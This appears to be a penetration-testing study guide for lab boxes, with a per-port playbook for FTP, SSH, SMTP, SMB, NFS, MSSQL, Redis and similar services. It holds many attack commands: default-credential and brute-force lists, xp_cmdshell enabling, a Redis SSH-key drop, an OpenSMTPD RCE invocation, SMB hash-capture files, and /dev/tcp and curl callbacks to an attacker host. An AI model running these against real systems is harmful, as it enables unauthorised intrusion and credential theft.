Network services methodology

A per-port playbook for everything nmap surfaces that isn't HTTP — FTP, SMB, SSH, SMTP, Redis, PostgreSQL, MSSQL, and the rest — with a frequency-ranked service-exploitation table and an 'I see X port, try Y' decision tree.

Per-port checklist for anything nmap surfaces that isn't HTTP. Web-first stuff lives in the Web methodology; this covers raw protocols where the box hinges on a service exploit.

Prime Rules

  1. Fingerprint every port — banner + version — before touching anything. Non-standard ports are usually intentional signals from the box author.
  2. Anonymous / default access first — SMB anon share, FTP anon, Redis no-auth, PostgreSQL postgres:postgres, SNMP public, LDAP anon bind. Cheap and often wins.
  3. Every service has 2-3 CVEs worth knowing — memorise the version -> CVE map.
  4. Verify service is running as root before spending time on privesc — Redis, FreeSWITCH, mysqldump-in-cron all frequently ran as root on PG.
  5. Full-port scan is mandatory — -p-. Non-default ports (5437 PostgreSQL, 43022 SSH, 7742 HTTP, 17001 .NET Remoting) are common on PG.

The Distilled Methodology

Phase A — Full Scan + Service ID

sudo nmap -Pn -sC -sV -p- -v <IP> -oN scan.txt
# Note: any port you don't recognise, run:
nc -nv <IP> <PORT>              # grab banner

Phase B — Per-Port Triage

For each open port, the workflow is: fingerprint -> default creds -> CVE search -> anon/read primitive -> exploit chain.

Per-Port Playbook

21 — FTP

# Anon check + banner:
ftp -A <IP>     # anonymous / <blank>
nc -nv <IP> 21  # vsftpd version leak in banner
  • Anon writable dir -> drop payload for another service to load (Sybaris: .so -> Redis MODULE LOAD)
  • Anon writable -> webroot -> PHP shell if FTP user owns Apache docroot (SpiderSociety non-standard port 2121)
  • vsftpd 2.3.4 -> backdoor smiley :) on USER — MSF exploit/unix/ftp/vsftpd_234_backdoor
  • ProFTPD 1.3.5b -> mod_copy CVE-2015-3306 (Roquefort had it exposed but Gitea Git Hooks was faster)
  • zFTPServer accounts/ dir -> filenames = username list (AuthBy)
  • Modern vsftpd default 600 mode -> SITE CHMOD 644 file from FTP client (SpiderSociety)
  • Non-standard port (2121, 21211) is a strong "intended path" signal

22 — SSH

  • Try defaults: root:root, root:toor, admin:admin, pi:raspberry, msfadmin:msfadmin
  • Hydra brute only when username is known (Hunit — real names from web page); use -u flag to iterate USERS per password (AuthBy: hydra -f -L users.txt -u -P wordlist <IP> ftp/ssh)
  • World-readable id_rsa on writable share / mode 755 -> ssh -i (Hunit)
  • git-shell forced command can still git clone/push — poison a repo cron pulls (Hunit)
  • Non-standard port (43022, 22222, 7742) is intentional — check
  • Modern OpenSSH -> EOL server compat flags:

bash ssh -p 22 <USER>@<IP> -oHostKeyAlgorithms=+ssh-rsa \ -oKexAlgorithms=+diffie-hellman-group1-sha1 \ -oPubkeyAcceptedAlgorithms=+ssh-rsa

(Zenphoto — Ubuntu 10.04-era server) * Forced-command / restricted-shell wrapper matching on SSH_ORIGINAL_COMMAND -> force legacy SCP protocol with scp -O (Sorcerer)

25 — SMTP

nc -nv <IP> 25                                        # banner reveals product

# Enumeration:
smtp-user-enum -M VRFY -U users.txt -t <IP>           # PostFish
smtp-user-enum -M RCPT -D <DOMAIN> -U users.txt -t <IP>
#   -M    method (VRFY, EXPN, RCPT)
#   -U    username wordlist
#   -D    domain to append (RCPT mode)
#   -t    target IP

# Manual:
telnet <IP> 25
HELO x
VRFY bob                                              # 252 = maybe, 250 = confirmed, 550 = no
  • OpenSMTPD 6.6.x -> CVE-2020-7247 unauth root RCE via MAIL FROM:<;cmd;>

bash # EDB 47984 Python payload (double-escape quotes): python3 47984.py <IP> 25 '<reverse-shell-payload>' * Postfix + writable content_filter script -> filter runs as filter user; inject shell (PostFish) * swaks for phishing delivery when a bot processes inbound mail (Hepet — MMG-LO ODS attachment)

53 — DNS

dig axfr <DOMAIN> @<IP>                              # zone transfer
dnsenum --dnsserver <IP> <DOMAIN>
dig -x <IP> @<IP>                                    # reverse
  • Zone transfer routinely leaks subdomains and internal hostnames
  • DNS-based egress is often whitelisted — try 53 for reverse shells when 80/443/4444 fail

79 — finger

for u in ela agnes charlotte magnus jonas martha admin; do finger $u@<IP>; done

# No client? Talk to port 79 directly:
echo $u | nc <IP> 79
# Valid = "Login: foo  Name: Foo"; invalid = "not known at this site"

(Hepet)

88, 389, 636, 464 — Kerberos + LDAP + LDAPS + kpasswd

See the Active Directory methodology. Presence of port 88 = DC.

110 / 143 — POP3 / IMAP

  • Read /var/mail/<user> after any user compromise (Scrutiny, PostFish) — colleagues share creds by email
  • IMAP with auth -> mailbox -> attachments / drafts

111 — NFS

showmount -e <IP>                                    # list exports
mkdir /tmp/mnt && sudo mount -t nfs <IP>:/SHARE /tmp/mnt -o nolock
ls -la /tmp/mnt

# no_root_squash -> touch a SUID as root on the target from your box:
sudo cp /bin/bash /tmp/mnt/bash && sudo chmod +s /tmp/mnt/bash
# then on target: /path/to/mount/bash -p -> euid=0

135, 445 — SMB

# Enumeration (from anonymous):
smbclient -N -L //<IP>
enum4linux-ng -A <IP>
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --rid-brute            # guest fallback (Vault)
  • Anonymous read on backups, Public, IPC$ -> any .bak / passwd / config files
  • Writable share -> forced-auth files (.url / .scf / desktop.ini with @-prefix — Vault):

bash smbclient -N //<IP>/<SHARE> -c 'put @poison.url; put @poison.scf; put desktop.ini' sudo responder -I tun0 -dwv # -A analyse-only variant is EXAM-OK; poisoning is BANNED hashcat -m 5600 anirudh.hash /usr/share/wordlists/rockyou.txt * NTDS backup share (Password Audit, Backups) with Active Directory/ + registry/ -> secretsdump -ntds ... LOCAL (Resourced) * MS17-010 (see EternalBlue chain — Internal)

139, 445 — NBT-NS / SMB — see 445 above

161 — SNMP

onesixtyone -c /usr/share/wordlists/seclists/SNMP/common-snmp-community-strings.txt <IP>

# Once you have a community string:
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2  # running processes (creds in cmdlines)

1433 — MSSQL

impacket-mssqlclient <DOMAIN>/<USER>@<IP> -windows-auth

# Enumeration:
SELECT name FROM master.sys.databases;
SELECT IS_SRVROLEMEMBER('sysadmin');

# xp_cmdshell if sysadmin:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
  • Silver ticket for MSSQL SPN when you own a service account's NT hash (Nagoya) — see Kerberos attacks

  • Remote root with --skip-ssl / --ssl-mode=DISABLED when server has no TLS (Apex)

xfreerdp3 /v:<IP> /u:<USER> /p:'<PASS>' /cert:ignore /clipboard +dynamic-resolution

  • Group Remote Desktop Users -> GUI LPE via elevated file dialog (Mice — EDB 50047)

\du

5985 / 5986 — WinRM

nxc winrm <IP> -u <USER> -p '<PASS>'
evil-winrm -i <IP> -u <USER> -p '<PASS>'
# 5986 = HTTPS; add -S for SSL
  • User not in Remote Management Users -> falls back to RunasCs (Access) or PsExec (see 445)

6379 — Redis

redis-cli -h <IP>
INFO         # confirm no NOAUTH
  • Redis running as root on default install (Wombo) -> full root
  • SLAVEOF replication to attacker (jas502n/Redis-RCE) — needs a reachable port on attacker (80/443 usually only options — -P 80)
  • MODULE LOAD via anon FTP write (Sybaris — RedisModules-ExecuteCommand.so)
  • Redis 4.x – 5.x = MODULE LOAD; 6.x+ may need CONFIG SET enable-module-command yes first
  • Older Redis (pre-module) -> SSH-key drop:

CONFIG SET dir /var/lib/redis/.ssh/ CONFIG SET dbfilename authorized_keys SET x "\n\n\n<PUBKEY>\n\n\n" SAVE * Auth'd — try foobared, redis, password, admin before hydra

8021 — FreeSWITCH mod_event_socket

# Auth first:
nc -nv <IP> 8021
auth <password>
api system id

Password often in /etc/freeswitch/autoload_configs/event_socket.conf.xml or /proc/self/cmdline via an LFI (Clue).

Decision Tree — "I See X Port, Try Y"

Observation Response
SMB open + smbclient -N -L returns shares Download every accessible file to /tmp/loot/; grep for creds
445 + guest anon rejected nxc smb -u guest -p '' --rid-brute (Vault)
Redis on 6379 + INFO responds without auth Straight to SLAVEOF module RCE (Wombo); if egress port constrained, use -P 80
PostgreSQL banner responds + non-standard port postgres:postgres first (Nibbles)
OpenSMTPD in banner CVE-2020-7247 immediately (Bratarina) — hostname often the hint
Kerberos port 88 open + LDAP 389 This is a DC -> Active Directory methodology
Any anon FTP writable dir + Redis on the box MODULE LOAD chain (Sybaris)
Any writable SMB share Forced-auth .url / .scf / desktop.ini (Vault) — but Responder poisoning is BANNED
SmarterMail on 9998 CVE-2019-7214 on 17001 (Algernon)
Cockpit on 9090 Skip if SSH also present; use only when SSH blocks the account (blaze)
Non-standard port on SSH/PostgreSQL/HTTP This is deliberate. Prioritise
Multiple HTTP alt ports Each is a different app; probe all independently

Egress Port Survival

Common labs whitelist non-4444 ports:

for p in 80 443 4444 21 53 3000 8000 8080; do
  timeout 3 bash -c "echo > /dev/tcp/<LHOST>/$p" 2>/dev/null && echo "$p OPEN"
done

Boxes where non-4444 was mandatory:

  • Roquefort — only port 21 worked
  • Bratarina — payload survival on port 80
  • Wombo — SLAVEOF exploit needed -P 80 (Redis calls back for RDB)
  • Snookums, Fired, Flu — port 80 or 443
  • WallpaperHub, BitForge — port 80

Egress canary to confirm outbound reachability (Exfiltrated):

# Attacker:
python3 -m http.server 8000

# Target (in webshell/RCE):
curl http://<LHOST>:8000/canary
# GET logged -> that port is open outbound

  • [ ] sudo nmap -Pn -sC -sV -p- -v <IP> -oN scan.txt

  • [ ] Version -> CVE search (searchsploit <product>)
  • [ ] Anonymous / default cred probe before exploit hunt
  • [ ] SMB: enum4linux-ng, nxc --shares, RID brute with guest fallback
  • [ ] FTP: anon + writable-dir check; PWD, SITE CHMOD
  • [ ] Redis: INFO unauth?
  • [ ] PostgreSQL: postgres:postgres first
  • [ ] SNMP: onesixtyone common strings
  • [ ] Any DC-shaped port set (88+389+636) -> jump to Active Directory methodology
  • [ ] Non-standard port = intended path
  • [ ] Egress port test before firing any callback
  • [ ] Metasploit exploit modules = ONE target only
